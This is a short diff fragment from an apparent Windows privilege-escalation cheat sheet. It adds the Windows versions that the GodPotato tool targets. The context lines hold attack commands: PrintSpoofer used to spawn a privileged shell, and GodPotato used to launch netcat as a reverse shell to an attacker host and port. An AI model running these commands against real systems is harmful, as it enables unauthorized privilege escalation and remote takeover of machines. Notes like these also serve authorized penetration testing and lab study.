@@ -308,7 +308,8 @@ victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 whoami
 ```
 ##### Godpotato
-ImpersonatePrivilege permission required
+ImpersonatePrivilege permission required  
+Windows Server 2012 - Windows Server 2022, Windows 8 - Windows 11
 ```
 GodPotato-NET4.exe
 GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.102(LHOST) 2012(LPORT)"
